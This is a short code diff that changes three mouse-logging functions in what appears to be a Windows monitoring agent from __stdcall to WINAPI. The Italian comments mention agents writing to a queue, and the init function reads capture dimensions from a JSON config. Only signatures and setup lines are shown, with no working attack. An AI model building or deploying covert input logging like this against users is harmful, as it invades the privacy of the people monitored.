@@ -22,7 +22,7 @@
 #define DEFAULT_MOUSE_Y_CAP 40
 DWORD mouse_x_cap = 0, mouse_y_cap = 0;
 
-DWORD __stdcall PM_MouseLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
+DWORD WINAPI PM_MouseLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
 	int xPos, yPos;
 	HWND hwnd = (HWND) dwFlags;
@@ -39,7 +39,7 @@ DWORD __stdcall PM_MouseLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 }
 
 
-DWORD __stdcall PM_MouseLogStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_MouseLogStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	// Durante la sync gli agenti continuano a scrivere nella coda.
 	// Solo una start/stop esplicita fa cambiare stato agli hook
@@ -50,7 +50,7 @@ DWORD __stdcall PM_MouseLogStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_MouseLogInit(JSONObject elem)
+DWORD WINAPI PM_MouseLogInit(JSONObject elem)
 {
 	mouse_x_cap = (DWORD) elem[L"width"]->AsNumber();
 	mouse_y_cap = (DWORD) elem[L"height"]->AsNumber();
